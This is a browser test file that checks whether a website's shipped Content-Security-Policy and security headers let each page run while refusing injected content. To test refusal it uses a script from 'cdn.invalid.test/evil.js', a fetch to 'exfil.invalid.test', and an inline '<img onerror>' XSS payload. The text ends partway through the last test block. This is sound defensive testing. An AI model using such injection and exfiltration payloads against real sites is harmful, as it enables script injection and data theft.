/* test_csp.mjs — the security headers we SHIP, exercised by the browser that has to obey them.
 *
 * `sim/web/_headers` is only ever sent by Cloudflare Pages, and a CSP that refuses a page's
 * own script does not degrade — it blanks the page in production. So this parses the REAL
 * `_headers` (never a restated copy), serves every page with it, and asserts each one still
 * WORKS. With TEETH: off-origin and inline scripts injected into the page must be REFUSED,
 * so green cannot mean "no policy arrived".
 *   · block 6 recomputes every script-src SHA-256 from the pages on disk, independently of
 *     `sim/tools/build_csp_hashes.py`, so the generator cannot satisfy its own guard;
 *   · block 7 injects an inline `<script>` and an inline `onerror=` and requires refusal;
 *   · block 8 DRIVES each page (search, typed turn, QR) with a `securitypolicyviolation`
 *     listener installed before any page script runs.
 *
 *   node sim/test_csp.mjs
 */
import { readFileSync, readdirSync } from "node:fs";
import { join } from "node:path";
import { createHash } from "node:crypto";
import { requireBrowser, serveWeb, serveStatic, pagesHeaders, makeChecks, finish, web, launchBrowser } from "./browser_harness.mjs";

const LABEL = "CSP + security-headers test";
const { puppeteer, chrome } = await requireBrowser(LABEL);
const { fails, ok, eq, count } = makeChecks();
const deep = (a, b, m) => eq(JSON.stringify(a), JSON.stringify(b), m);

/** Turnstile's widget host. Named ONCE so every assertion below is about the same string,
 *  and so the near-neighbour trap is visible: the allowance is `challenges.cloudflare.com`
 *  exactly — a bare `cloudflare.com` is a DIFFERENT host and is still refused (block 9). */
const TURNSTILE = "https://challenges.cloudflare.com";

const site = await serveWeb({ headers: true });
const H = pagesHeaders();
const CSP = H["Content-Security-Policy"] || "";
/** One directive of the shipped CSP, e.g. `directive("script-src")` → "script-src 'self' …". */
const directive = (name) => (CSP.split(";").find((d) => d.trim().startsWith(name)) || "").trim();

/* Served under a NON-local hostname mapped to loopback — the configuration Pages ships
 * into. On a local host env.js also probes the :8081/:8082 sidecars, a dev-only refusal
 * that would hide real ones behind an allowance. */
const HOST = `http://moxie.hosted.test:${site.port}`;

const browser = await launchBrowser(puppeteer, chrome, { hosts: { "moxie.hosted.test": site.port } });

/* ONE known off-site image refusal, named exactly so the guard stays strict for everything
 * else (an off-site image in a doc is the defect, not the policy). */
const KNOWN_REFUSALS = [/user-attachments.*violates.*img-src/i];

/** What the real `static.cloudflareinsights.com` sends, and what a module fetch needs. */
const CORS = { "Access-Control-Allow-Origin": "*" };

const POLICY_LINE = /Content Security Policy|Refused to (load|connect|execute|run|apply|frame)/i;
const isKnown = (e) => KNOWN_REFUSALS.some((k) => k.test(e));

/** Console lines that are a POLICY refusal we have NOT already accounted for. */
const cspErrors = (errs) => errs.filter((e) => POLICY_LINE.test(e) && !isKnown(e));

/* WAITING: every injection resolves on the browser's own `load`/`error`/violation event.
 * `CEILING` only stops a hung renderer from hanging the suite (slowest measured ~6.7 s at
 * 20x throttle); an expiry yields a SENTENCE naming what never arrived, never comparable to
 * "loaded", "refused" or `null`, so it cannot be read as a verdict. */
const CEILING = 30000;

/** Poll a NODE-side predicate (puppeteer's console/`errs` arrays live in this process). */
const until = async (pred, ms = CEILING, step = 50) => {
  const t0 = Date.now();
  for (;;) {
    if (pred()) return true;
    if (Date.now() - t0 >= ms) return false;
    await new Promise((r) => setTimeout(r, step));
  }
};

/** Poll an IN-PAGE predicate; the first truthy value, or `null` on expiry. Caught rather
 *  than thrown (`waitForFunction` throws), so one expiry cannot abort every later block;
 *  each caller NAMES what it waited for. */
const untilPage = async (page, fn, arg = null, ms = CEILING) => {
  try {
    const h = await page.waitForFunction(fn, { polling: 100, timeout: ms }, arg);
    return await h.jsonValue();
  } catch { return null; }
};

let injectN = 0;
/** Add a `<script src>` the way Pages injects the beacon and report WHAT THE BROWSER
 *  DECIDED: "loaded" (`load`, which fires only after evaluation) or "refused" (`error`).
 *  If neither fires the result is a sentence about the renderer, not a third verdict.
 *  `module: true` mirrors Pages' `type="module" crossorigin="anonymous"` tag (hence CORS
 *  in the interceptors). */
const injectTag = async (page, src, { module = false } = {}) => {
  const tag = `i${++injectN}`;
  await page.evaluate((u, t, mod) => {
    (window.__inject = window.__inject || {})[t] = null;
    const s = document.createElement("script");
    if (mod) s.type = "module";
    s.src = u;
    s.onload = () => { window.__inject[t] = "loaded"; };
    s.onerror = () => { window.__inject[t] = "refused"; };
    document.head.appendChild(s);
  }, src, tag, module);
  return (await untilPage(page, (t) => window.__inject[t] || null, tag)) ||
    `GAVE UP: <script src="${src}"> fired NEITHER load NOR error within ${CEILING} ms — ` +
    "a starved renderer, NOT a policy verdict; do not read this as one";
};

/* Each page, and the runtime fact that proves its scripts really ran under the policy. */
const PAGES = [
  ["index.html", () => !!document.getElementById("bg-canvas")],
  ["setup.html", () => !!document.getElementById("bg-canvas") && !!window.moxieQR],
  ["cloud.html", () => !!document.getElementById("bg-canvas")],
  ["docs.html", () => !!document.getElementById("tree") &&
                      document.querySelectorAll("#tree a, #tree button, #tree li").length > 0],
  // `window.moxie` exists only if the ES module graph resolved through sim.html's hashed
  // importmap and three.js loaded from ./vendor — the most CSP-fragile thing on the site.
  ["sim.html", () => !!window.moxie && !!window.moxieBridge && !!window.moxieAudio &&
                     !!window.moxieMode && !!window.moxieTypedTurn && !!window.moxieStub],
];

async function load(path) {
  const page = await browser.newPage();
  await page.setViewport({ width: 1440, height: 900 });
  /* The violation EVENT (directive + blocked URI; fires even when nothing is logged),
   * installed before any page script runs. */
  await page.evaluateOnNewDocument(() => {
    window.__cspViolations = [];
    document.addEventListener("securitypolicyviolation", (e) => {
      window.__cspViolations.push({
        directive: e.effectiveDirective || e.violatedDirective,
        blocked: e.blockedURI,
        sample: (e.sample || "").slice(0, 60),
      });
    });
  });
  const errs = [], notFound = [];
  page.on("console", (m) => { if (m.type() === "error") errs.push(m.text()); });
  page.on("pageerror", (e) => errs.push("PAGEERR " + e.message));
  // Which URLs actually 404'd, so the console line can be correlated with a real response
  // instead of forgiven on the strength of its text (see the loop below).
  page.on("response", (r) => { if (r.status() === 404) notFound.push(r.url()); });
  const res = await page.goto(`${HOST}/${path}`, { waitUntil: "domcontentloaded", timeout: 20000 });
  /* Wait for the `load` condition (untilPage never throws; an expiry falls through to the
   * assertions). The fixed window AFTER it stays: it backs an assertion that NOTHING was
   * refused, and an absence has no event to wait for. */
  await untilPage(page, () => document.readyState === "complete" || null, null, 20000);
  await new Promise((r) => setTimeout(r, 2500));
  return { page, errs, headers: res.headers(), notFound };
}

try {
  /* =====================================================================
   * 1. The policy itself — read off the file we ship, not off a memory of it.
   * =================================================================== */
  {
    const csp = H["Content-Security-Policy"] || "";
    ok(/(^|;\s*)script-src\s+'self'/.test(csp),
       `_headers must pin script-src to 'self' (got ${JSON.stringify(csp)})`);
    /* connect-src: `'self'` plus exactly Turnstile's host — the exfiltration half of XSS, and
     * the directive that refused the port-8081 fetch. Exhaustive list, so any widening is a
     * diff to this line. */
    const connectSrc = directive("connect-src");
    deep(connectSrc.split(/\s+/).slice(1), ["'self'", TURNSTILE],
       "connect-src is 'self' plus EXACTLY the Turnstile host — nothing else may exfiltrate");

    /* The off-origin SCRIPT hosts, exhaustively: the Pages-injected analytics beacon and
     * Turnstile's api.js (neither can be self-hosted; `_headers` has the reasoning). No third
     * without editing this line. */
    ok(/(^|;\s*)script-src\s[^;]*\bhttps:\/\/static\.cloudflareinsights\.com\b/.test(csp),
       "script-src allows Cloudflare's injected analytics beacon host");
    ok(/(^|;\s*)script-src\s[^;]*\bhttps:\/\/challenges\.cloudflare\.com\b/.test(csp),
       "script-src allows Turnstile's widget host (without it the widget never renders)");
    const scriptSrc = directive("script-src");
    const hosts = scriptSrc.split(/\s+/).slice(1).filter((t) => /:/.test(t) && !/^'/.test(t));
    eq(JSON.stringify(hosts), JSON.stringify(["https://static.cloudflareinsights.com", TURNSTILE]),
       "…and script-src names EXACTLY those two off-origin hosts, no other");
    ok(!/cloudflareinsights/.test(connectSrc),
       "connect-src does NOT name the beacon: it reports to a SAME-ORIGIN /cdn-cgi/rum (see _headers)");
    /* frame-src is exactly Turnstile's host: with `'none'` the widget silently never produces a
     * token. No page frames anything else. */
    const frameSrc = directive("frame-src");
    deep(frameSrc.split(/\s+/).slice(1), [TURNSTILE],
       "frame-src is EXACTLY the Turnstile host — nothing else on this site may be framed");
    for (const d of ["object-src 'none'", "base-uri 'none'", "frame-ancestors 'none'", "form-action 'none'"])
      ok(csp.includes(d), `_headers must carry ${d}`);
    const hsts = H["Strict-Transport-Security"] || "";
    ok(/max-age=\d{7,}/.test(hsts), `HSTS must be set with a real max-age (got ${JSON.stringify(hsts)})`);
    eq(H["X-Content-Type-Options"], "nosniff", "nosniff is still there");
  }

  /* =====================================================================
   * 2. Every page still works with that policy actually applied.
   * =================================================================== */
  for (const [path, probe] of PAGES) {
    const { page, errs, headers, notFound } = await load(path);
    ok((headers["content-security-policy"] || "").includes("script-src"),
       `${path}: the browser really received the policy`);
    ok((headers["strict-transport-security"] || "").includes("max-age"),
       `${path}: …and HSTS`);
    eq(cspErrors(errs).length, 0,
       `${path}: NOTHING was refused by the policy — ${cspErrors(errs).slice(0, 3).join(" | ")}`);
    ok(await page.evaluate(probe),
       `${path}: its scripts actually ran under the policy (the inline blocks were not refused)`);
    /* Anything else on the console is a page fault. The one expected 404 (mode.js's
     * `/api/health` probe on a static server) is forgiven one-for-one against observed 404
     * responses, so a genuinely missing asset still fails. */
    const expected404 = notFound.every((u) => /\/api\/health\b/.test(u));
    let budget = expected404 ? notFound.length : 0;
    const other = errs.filter((e) => {
      if (POLICY_LINE.test(e) || isKnown(e)) return false;
      if (budget > 0 && /Failed to load resource: the server responded with a status of 404/.test(e)) {
        budget--; return false;
      }
      return true;
    });
    eq(other.length, 0, `${path}: no other console errors — ${other.slice(0, 3).join(" | ")}`);
    await page.close();
  }

  /* =====================================================================
   * 3. TEETH — the policy is in force, and it refuses what it should.
   * =================================================================== */
  {
    const { page, errs } = await load("sim.html");
    const before = cspErrors(errs).length;
    eq(before, 0, "teeth: the page is clean before anything is injected");

    const loaded = await injectTag(page, "https://cdn.invalid.test/evil.js");
    eq(loaded, "refused",
       "teeth: a script from another origin is REFUSED — without script-src it would have run");
    /* The console line is waited for node-side, not slept for. */
    await until(() => cspErrors(errs).length > before);
    ok(cspErrors(errs).length > before,
       "teeth: …and the browser logged the refusal, so the policy really is the one in force");

    const fetched = await page.evaluate(() =>
      fetch("https://exfil.invalid.test/x", { mode: "cors" }).then(() => "sent").catch(() => "blocked"));
    eq(fetched, "blocked", "teeth: connect-src still refuses an off-origin request");
    await page.close();
  }

  /* =====================================================================
   * 4. THE BEACON HOST — allowed by name, and by name ONLY.
   * A script from `static.cloudflareinsights.com` RUNS, and one from the BARE
   * `cloudflareinsights.com` (one label away) is still REFUSED. Answered at the browser: a
   * CSP refusal happens before the request, so reaching the interceptor means permitted.
   * =================================================================== */
  {
    const page = await browser.newPage();
    await page.setViewport({ width: 1440, height: 900 });
    const errs = [];
    page.on("console", (m) => { if (m.type() === "error") errs.push(m.text()); });
    page.on("pageerror", (e) => errs.push("PAGEERR " + e.message));
    await page.setRequestInterception(true);
    page.on("request", (r) => {
      if (r.isInterceptResolutionHandled()) return;
      const u = r.url();
      // CORS required: Pages' tag is `crossorigin="anonymous"` + `type="module"`.
      if (/^https:\/\/static\.cloudflareinsights\.com\//.test(u))
        return r.respond({ status: 200, contentType: "text/javascript", headers: CORS,
                           body: "window.__beacon = 'ran';" });
      if (/^https:\/\/cloudflareinsights\.com\//.test(u))
        return r.respond({ status: 200, contentType: "text/javascript", headers: CORS,
                           body: "window.__sibling = 'ran';" });
      return r.continue();
    });
    await page.goto(`${HOST}/sim.html`, { waitUntil: "domcontentloaded", timeout: 20000 });
    /* Wait for `window.moxie`: inject only once sim.html's own module graph has resolved. */
    await untilPage(page, () => !!window.moxie || null);

    /* `injectTag` returns the browser's verdict, never a third comparable value. */
    const beacon = await injectTag(page,
      "https://static.cloudflareinsights.com/beacon.min.js/vTESTONLY", { module: true });
    eq(beacon, "loaded",
       "the injected Cloudflare beacon LOADS — the console error on every page load is gone");
    eq(await page.evaluate(() => window.__beacon || null), "ran", "…and actually executed");

    const sibling = await injectTag(page,
      "https://cloudflareinsights.com/beacon.min.js/vTESTONLY", { module: true });
    eq(sibling, "refused",
       "…while the BARE cloudflareinsights.com is still refused: the allowance is host-exact");
    /* `__sibling === null` alone is satisfied by a script that has not run YET; the
     * `sibling === "refused"` guard anchors the absence to the browser's decision. */
    const siblingRan = await page.evaluate(() => window.__sibling || null);
    eq(sibling === "refused" ? siblingRan : sibling, null, "…and never ran");
    // Match the URL the browser NAMES as refused (the line also quotes the policy back).
    const logged = () => cspErrors(errs).some((e) => /'https:\/\/cloudflareinsights\.com\//.test(e));
    await until(logged);
    ok(logged(), "…with the refusal logged, so the policy really is the one in force");

    /* The beacon reports via `sendBeacon` to the RELATIVE `/cdn-cgi/rum` (our tag carries a
     * `version`), so `connect-src 'self'` covers it. `sendBeacon` returns false on refusal. */
    eq(await page.evaluate(() => navigator.sendBeacon("/cdn-cgi/rum?test", "x")), true,
       "the beacon's SAME-ORIGIN report path is permitted by connect-src 'self' as it stands");
    // ...and the off-origin one is still refused — asserted with `fetch`, because Chrome's
    // sendBeacon returns `true` before the policy check resolves.
    eq(await page.evaluate(() =>
         fetch("https://cloudflareinsights.com/cdn-cgi/rum", { method: "POST", body: "x" })
           .then(() => "sent").catch(() => "blocked")), "blocked",
       "…and an off-origin report would still be refused — connect-src keeps its teeth");
    await page.close();
  }
  /* =====================================================================
   * 5. THE POLICY HAS NO INLINE ESCAPE HATCH LEFT: no `'unsafe-inline'` in script-src.
   * =================================================================== */
  {
    const csp = H["Content-Security-Policy"] || "";
    const scriptSrc = directive("script-src");
    ok(!/'unsafe-inline'/.test(scriptSrc),
       `script-src must NOT carry 'unsafe-inline' (got ${JSON.stringify(scriptSrc)})`);
    /* `'unsafe-hashes'` is not needed (no inline handler attributes; block 6 proves it), and is
     * the obvious thing a future pass would reach for. */
    ok(!/'unsafe-hashes'/.test(csp), "the CSP must NOT carry 'unsafe-hashes' anywhere");
    ok(!/'unsafe-eval'/.test(csp), "…nor 'unsafe-eval'");
    /* Only 'self' and SHA-256 hashes may be quoted in script-src; any other keyword is a
     * widening (`'strict-dynamic'` would void the host allowance). */
    const quoted = scriptSrc.split(/\s+/).filter((t) => t.startsWith("'"));
    const stray = quoted.filter((t) => t !== "'self'" && !/^'sha256-[A-Za-z0-9+/]+={0,2}'$/.test(t));
    eq(JSON.stringify(stray), "[]",
       `script-src's quoted sources must be 'self' + sha256 hashes only (stray: ${stray.join(" ")})`);
  }

  /* =====================================================================
   * 6. THE HASHES MATCH THE PAGES ON DISK — the blank-page guard, recomputed independently
   *    of `sim/tools/build_csp_hashes.py` (`sim/tests/test_csp_hashes.py` is the fast twin).
   * =================================================================== */
  {
    const INLINE = /<script(?![^>]*\ssrc\s*=)([^>]*)>([\s\S]*?)<\/script>/g;
    const pages = readdirSync(web).filter((f) => f.endsWith(".html")).sort();
    ok(pages.length === 5, `expected the five shipped pages, got ${pages.length}: ${pages}`);

    const blocks = [];
    const handlers = [];
    for (const name of pages) {
      const src = readFileSync(join(web, name), "utf8");
      for (const m of src.matchAll(INLINE))
        blocks.push({ name, attrs: (m[1] || "").trim(), body: m[2],
                      line: src.slice(0, m.index).split("\n").length });
      /* An inline handler ATTRIBUTE (`onclick="…"`) cannot be rescued by any hash and fails
       * silently — it never fires. Only markup is scanned: `el.onclick = fn` in a .js file is a
       * function object, not an inline script. */
      for (const m of src.matchAll(/<[^>!][^>]*?\son[a-z]+\s*=\s*["'][^"']*["'][^>]*>/gi))
        handlers.push(`${name}:${src.slice(0, m.index).split("\n").length}`);
      for (const m of src.matchAll(/(?:href|src|action|formaction)\s*=\s*["']\s*javascript:/gi))
        handlers.push(`${name}:${src.slice(0, m.index).split("\n").length} javascript: URL`);
    }
    eq(JSON.stringify(handlers), "[]",
       `no shipped page may carry an inline on*= attribute or javascript: URL — ` +
       `they need 'unsafe-hashes', which this policy does not grant, and they fail SILENTLY ` +
       `(found: ${handlers.join(", ")})`);

    /* The inline surface, pinned by name: only sim.html's importmap remains (importmaps cannot
     * be external). If this grows, the fix is almost always another file, not another hash. */
    eq(blocks.length, 1,
       `exactly ONE inline <script> should remain on the whole site — ` +
       `${blocks.map((b) => `${b.name}:${b.line}`).join(", ")}`);
    ok(blocks.every((b) => b.name === "sim.html" && /type="importmap"/.test(b.attrs)),
       "…and it is sim.html's importmap, the one block that genuinely cannot be external");

    const want = blocks.map((b) =>
      "'sha256-" + createHash("sha256").update(b.body, "utf8").digest("base64") + "'").sort();
    const csp = H["Content-Security-Policy"] || "";
    const scriptSrc = directive("script-src");
    const have = scriptSrc.split(/\s+/).filter((t) => t.startsWith("'sha256-")).sort();
    eq(JSON.stringify(have), JSON.stringify(want),
       "script-src's hashes must equal a fresh SHA-256 of every inline block on disk — " +
       "A MISMATCH BLANKS THE PAGE. Run: python3 sim/tools/build_csp_hashes.py");
  }

  /* =====================================================================
   * 7. TEETH FOR THE INLINE HALF — an inline <script> is REFUSED, so markup an attacker lands
   *    on the page cannot execute. Goes red the moment 'unsafe-inline' comes back.
   * =================================================================== */
  {
    const { page, errs } = await load("sim.html");
    eq(cspErrors(errs).length, 0, "inline teeth: the page is clean before anything is injected");

    const ran = await page.evaluate(() => {
      const s = document.createElement("script");
      s.textContent = "window.__inlineRan = 'ran';";
      document.head.appendChild(s);
      return window.__inlineRan || null;
    });
    eq(ran, null,
       "inline teeth: an injected inline <script> does NOT execute — with 'unsafe-inline' it would have");

    /* The route an XSS payload actually takes: `<img onerror>` via innerHTML. The absence of
     * `__handlerRan` is only evidence once the `error` event has been dispatched, so an
     * `addEventListener` witness (not policed by script-src) provides the barrier. */
    await page.evaluate(() => {
      window.__handlerRan = null;
      window.__imgErrored = null;
      const d = document.createElement("div");
      d.innerHTML = '<img src="data:," onerror="window.__handlerRan = \'ran\'">';
      // Attached synchronously, before the event can possibly arrive: `error` is queued
      // as a task and is never delivered during `innerHTML` parsing.
      d.querySelector("img").addEventListener("error", () => { window.__imgErrored = "fired"; });
      document.body.appendChild(d);
    });
    const errored = await untilPage(page, () => window.__imgErrored || null);
    const fired = errored
      ? await page.evaluate(() => window.__handlerRan || null)
      : `GAVE UP: the <img>'s error event never fired within ${CEILING} ms, so the inline ` +
        "handler was never given its chance — this is NOT evidence that the policy held";
    eq(fired, null, "inline teeth: an injected inline event-handler attribute does NOT fire either");

    await until(() => cspErrors(errs).length >= 1);
    ok(cspErrors(errs).length >= 1,
       "inline teeth: …and the browser logged the refusals, so the policy really is in force");

    /* And the ONE hashed block still runs: `window.moxie` needs sim.html's importmap. */
    ok(await page.evaluate(() => !!window.moxie),
       "…while the HASHED importmap still resolved: three.js loaded and the SIM booted");
    await page.close();
  }

  /* =====================================================================
   * 8. EVERY PAGE STILL *WORKS*, not merely renders — under the policy.
   * A page whose glue failed to load still paints its markup and CSS, so each page is DRIVEN
   * (docs search, SIM typed turn + QR, setup QR, console fixture) with a
   * `securitypolicyviolation` EVENT listener installed before any page script runs.
   * =================================================================== */
  {
    // Violations the page recorded — ALL of them, no carve-outs: ZERO.
    const violations = (p) => p.evaluate(() => window.__cspViolations || []);
    const show = (vs) => vs.map((v) => `${v.directive} ⟵ ${v.blocked}${v.sample ? " «" + v.sample + "»" : ""}`).join(" | ");

    /* --- sim.html: a typed turn end to end, and the QR card ------------------- */
    {
      const { page } = await load("sim.html");
      /* mqtt.js is fetched lazily by the first Link (bridge/index.js::loadMqtt), so a visit
       * that never links never pays for it — and when it IS fetched, 'self' must admit it. */
      const lazy = await page.evaluate(async () => {
        const before = typeof mqtt === "undefined" &&
          !performance.getEntriesByType("resource").some((e) => /mqtt\.min\.js/.test(e.name));
        const loaded = await window.moxieBridge.loadMqtt();
        return { before, loaded, after: typeof mqtt !== "undefined" && typeof mqtt.connect === "function" };
      });
      eq(lazy.before, true, "sim.html: mqtt.js is NOT fetched on a plain visit");
      ok(lazy.loaded && lazy.after, `sim.html: …and loadMqtt() fetches it under the shipped CSP (${JSON.stringify(lazy)})`);
      await page.type("#speech-input", "hello moxie");
      await page.click("#speech-btn");
      await new Promise((r) => setTimeout(r, 3500));
      const t = await page.evaluate(() => (document.getElementById("transcript") || {}).textContent || "");
      ok(/hello moxie/.test(t) && /Moxie/.test(t),
         `sim.html: a typed turn reaches the transcript AND is answered (got ${JSON.stringify(t.slice(0, 90))})`);

      await page.click("#qr-make");
      await new Promise((r) => setTimeout(r, 900));
      const qr = await page.evaluate(() => {
        const c = document.getElementById("qr-canvas");
        const d = c.getContext("2d").getImageData(0, 0, c.width, c.height).data;
        let dark = 0;   // OPAQUE and dark: an untouched canvas is rgba(0,0,0,0), not ink
        for (let i = 0; i < d.length; i += 4) if (d[i + 3] > 0 && d[i] < 128) dark++;
        return { dark, status: (document.getElementById("qr-status") || {}).textContent || "" };
      });
      ok(qr.dark > 500, `sim.html: the QR card actually drew a code (${qr.dark} dark px)`);
      ok(/\{/.test(qr.status), `sim.html: …and reported the payload it encoded (${qr.status.slice(0, 40)})`);
      const v = await violations(page);
      eq(v.length, 0, `sim.html: ZERO securitypolicyviolation events across a whole turn — ${show(v)}`);
      await page.close();
    }

    /* --- docs.html: search, then open a hit ----------------------------------- */
    {
      const { page } = await load("docs.html");
      /* The README hero image, asserted as PIXELS (a 404 or refusal still yields an `<img>`).
       * `complete` flips on load AND error; `naturalWidth > 0` separates the two. */
      await page.waitForFunction(() => {
        const i = document.querySelector("article img");
        return !!i && i.complete;
      }, { timeout: 8000 }).catch(() => {});
      const hero = await page.evaluate(() => {
        const i = document.querySelector("article img");
        return i ? { src: i.getAttribute("src"), complete: i.complete, w: i.naturalWidth, h: i.naturalHeight } : null;
      });
      // `complete` too: Chrome fills `naturalWidth` from the PNG header long before decode.
      ok(hero && hero.complete && hero.w > 0 && hero.h > 0,
         `docs.html: the README hero image actually DECODED (${JSON.stringify(hero)})`);
      ok(hero && /^img\//.test(hero.src || ""),
         `docs.html: …from this origin, the repo-relative src remapped onto the site root (${hero && hero.src})`);
      /* The ~3 MB search corpus loads on the first keystroke. `#tree a > 0` is true instantly
       * (the unfiltered tree), so the wait is the CLAIM: filtered (fewer) and not empty. */
      const allDocs = await page.evaluate(() => document.querySelectorAll("#tree a").length);
      await page.type("#q", "projectorfanpid");        // a body-only term: search must have run
      await page.waitForFunction(
        (n) => { const k = document.querySelectorAll("#tree a").length; return k > 0 && k < n; },
        // Sized for a cold cache (~7 MB); free when the corpus is already there.
        { timeout: 60000 }, allDocs,
      ).catch(() => {});
      await new Promise((r) => setTimeout(r, 1200));
      const hits = await page.evaluate(() => document.querySelectorAll("#tree a").length);
      ok(hits > 0, `docs.html: full-text search filters the tree (got ${hits} hits)`);
      await page.evaluate(() => { const a = document.querySelector("#tree a"); if (a) a.click(); });
      await new Promise((r) => setTimeout(r, 1400));
      const doc = await page.evaluate(() => ({
        len: (document.querySelector("article") || { textContent: "" }).textContent.length,
        marks: document.querySelectorAll("article mark, article .hl, article em").length }));
      ok(doc.len > 2000, `docs.html: the hit opens and renders Markdown (${doc.len} chars)`);
      ok(doc.marks > 0, "docs.html: …with the search term highlighted in it");
      const v = await violations(page);
      eq(v.length, 0, `docs.html: ZERO securitypolicyviolation events — ${show(v)}`);
      await page.close();
    }

    /* --- setup.html: encode a Wi-Fi code -------------------------------------- */
    {
      const { page } = await load("setup.html");
      await page.type("#ssid", "TestNet");
      await page.click("#go-wifi");
      await new Promise((r) => setTimeout(r, 700));
      const out = await page.evaluate(() => {
        const c = document.getElementById("cv-wifi");
        const d = c.getContext("2d").getImageData(0, 0, c.width, c.height).data;
        let dark = 0;   // OPAQUE and dark: an untouched canvas is rgba(0,0,0,0), not ink
        for (let i = 0; i < d.length; i += 4) if (d[i + 3] > 0 && d[i] < 128) dark++;
        return { dark, payload: (document.getElementById("pl-wifi") || {}).textContent || "" };
      });
      ok(out.dark > 500, `setup.html: the Wi-Fi QR drew (${out.dark} dark px)`);
      ok(/"ssid":\s*"TestNet"/.test(out.payload),
         `setup.html: …encoding the SSID that was typed (${out.payload.slice(0, 50)})`);
      const v = await violations(page);
      eq(v.length, 0, `setup.html: ZERO securitypolicyviolation events — ${show(v)}`);
      await page.close();
    }

    /* --- cloud.html + index.html: their glue ran ------------------------------ */
    {
      const { page } = await load("cloud.html");
      const c = await page.evaluate(() => ({
        tabs: document.querySelectorAll(".tab").length,
        body: (document.querySelector("[data-panel]") || { textContent: "" }).textContent.length }));
      eq(c.tabs, 5, "cloud.html: the console built its five tabs from the fixture");
      ok(c.body > 100, `cloud.html: …and rendered a panel (${c.body} chars)`);
      const v1 = await violations(page);
      eq(v1.length, 0, `cloud.html: ZERO securitypolicyviolation events — ${show(v1)}`);
      await page.close();

      const { page: ip } = await load("index.html");
      // Only home.js builds the sparkles: a direct witness that it ran.
      const n = await ip.evaluate(() => document.querySelectorAll("#bg .spark").length);
      ok(n > 0, `index.html: home.js ran — it built ${n} sparkles`);
      const v2 = await violations(ip);
      eq(v2.length, 0, `index.html: ZERO securitypolicyviolation events — ${show(v2)}`);
      await ip.close();
    }
  }

  /* =====================================================================
   * 9. THE TURNSTILE HOST — allowed in three directives, and by name ONLY.
   *   · a SCRIPT from `challenges.cloudflare.com` runs (else no widget, every send fails);
   *   · an IFRAME from it is allowed (else the script loads and silently never mints a token);
   *   · the BARE `cloudflare.com` is still REFUSED for both — host-exact.
   * Answered at the browser, no network. Also asserts the `_headers` no-cache entries: a
   * stale client script could mint tokens for yesterday's route.
   * =================================================================== */
  {
    /* ---- TRAP B, ENUMERATED RATHER THAN SPOT-CHECKED ----------------------- *
     * The app-script no-cache list is the whole mechanism, so EVERY `.js` this bundle ships must
     * have its own entry — asserted as a class, not for one remembered file.
     * (`sim/test_turnstile.mjs` §10 repeats this in the browser-free tier.) */
    const headerText = readFileSync(join(web, "_headers"), "utf8");
    const listed = new Set();
    for (const m of headerText.matchAll(/^\/([A-Za-z0-9._-]+\.js)\n\s+Cache-Control:\s*no-cache$/gm)) {
      listed.add(m[1]);
    }
    ok(listed.size > 15, `the app-script no-cache list parsed (${listed.size} entries)`);
    const shippedJs = readdirSync(web).filter((f) => f.endsWith(".js")).sort();
    ok(shippedJs.length > 15, `…and sim/web ships ${shippedJs.length} scripts to compare it with`);
    const unlisted = shippedJs.filter((f) => !listed.has(f));
    eq(JSON.stringify(unlisted), "[]",
       `EVERY script in sim/web has its own no-cache entry — unlisted: ${JSON.stringify(unlisted)}`);
    ok(listed.has("turnstile.js"),
       "…including turnstile.js, whose staleness would mint tokens for the wrong action");
    // App-script SUBDIRECTORIES (the split ES modules of moxie.js) are covered by one
    // directory rule each, so a new module file cannot be forgotten either.
    for (const dir of readdirSync(web, { withFileTypes: true })) {
      if (!dir.isDirectory() || dir.name === "vendor") continue;
      const js = readdirSync(join(web, dir.name)).filter((f) => f.endsWith(".js"));
      if (!js.length) continue;
      ok(new RegExp(`^/${dir.name}/\\*\\n\\s+Cache-Control:\\s*no-cache$`, "m").test(headerText),
         `sim/web/${dir.name}/ ships ${js.length} scripts and has a /${dir.name}/* no-cache rule`);
    }

    const page = await browser.newPage();
    await page.setViewport({ width: 1440, height: 900 });
    const errs = [];
    page.on("console", (m) => { if (m.type() === "error") errs.push(m.text()); });
    page.on("pageerror", (e) => errs.push("PAGEERR " + e.message));
    await page.setRequestInterception(true);
    page.on("request", (r) => {
      if (r.isInterceptResolutionHandled()) return;
      const u = r.url();
      if (/^https:\/\/challenges\.cloudflare\.com\//.test(u))
        return r.respond({ status: 200, contentType: "text/javascript", headers: CORS,
                           body: "window.__turnstileHost = 'ran';" });
      if (/^https:\/\/cloudflare\.com\//.test(u))
        return r.respond({ status: 200, contentType: "text/javascript", headers: CORS,
                           body: "window.__bareCloudflare = 'ran';" });
      return r.continue();
    });
    await page.goto(`${HOST}/sim.html`, { waitUntil: "domcontentloaded", timeout: 20000 });
    await untilPage(page, () => !!window.moxie || null);

    const turnstile = await injectTag(page,
      "https://challenges.cloudflare.com/turnstile/v0/api.js?render=explicit");
    eq(turnstile, "loaded", "Turnstile's widget script LOADS — script-src allows its host");
    eq(await page.evaluate(() => window.__turnstileHost || null), "ran", "…and actually executed");

    const bareScript = await injectTag(page, "https://cloudflare.com/turnstile/v0/api.js");
    eq(bareScript, "refused",
       "…while the BARE cloudflare.com is still refused: the allowance is host-exact");
    // Anchored to the refusal (see block 4): an absence before the browser decided is nothing.
    const bareRan = await page.evaluate(() => window.__bareCloudflare || null);
    eq(bareScript === "refused" ? bareRan : bareScript, null, "…and never ran");

    /* The iframe half: `frame-src` refusals never fire `onerror`, so the witness is the
     * violation EVENT, anchored to a barrier (the REQUIRED refusal observed) before asking
     * whether the ALLOWED host is absent; no barrier, both go red. */
    await page.evaluate((allowed, refused) => {
      window.__frameV = [];
      document.addEventListener("securitypolicyviolation", (e) => {
        window.__frameV.push({ d: e.effectiveDirective || e.violatedDirective, u: e.blockedURI });
      });
      for (const u of [allowed, refused]) {
        const f = document.createElement("iframe");
        f.src = u;
        f.style.display = "none";
        document.body.appendChild(f);
      }
    }, "https://challenges.cloudflare.com/cdn-cgi/challenge-platform/", "https://cloudflare.com/frame");
    const barrier = await untilPage(page, () =>
      (window.__frameV || []).some((x) => /frame/.test(x.d || "") &&
        /^https:\/\/cloudflare\.com/.test(x.u || "")) ? window.__frameV : null);
    // Margin only: the allowed iframe was appended FIRST, so its refusal would queue ahead.
    if (barrier) await new Promise((r) => setTimeout(r, 400));
    const framed = barrier ? await page.evaluate(() => window.__frameV) : null;
    const gaveUp = `GAVE UP: no frame-src violation for the bare host within ${CEILING} ms — ` +
                   "the renderer never delivered one, so neither check below has evidence";
